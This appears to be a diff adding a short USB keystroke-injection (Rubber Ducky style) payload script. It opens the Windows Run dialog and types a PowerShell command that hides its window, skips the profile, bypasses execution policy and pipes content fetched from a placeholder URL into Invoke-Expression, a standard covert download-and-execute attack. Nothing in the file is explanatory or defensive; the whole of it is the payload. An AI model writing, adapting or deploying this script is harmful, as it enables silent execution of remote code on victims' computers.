@@ -1,0 +1,6 @@
+GUI r
+DELAY 500
+REM long version: -windowstyle hidden -NoProfile -noninteractive -executionpolicy bypass
+STRING powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE'; url_to_github | iex
+DELAY 500
+ENTER
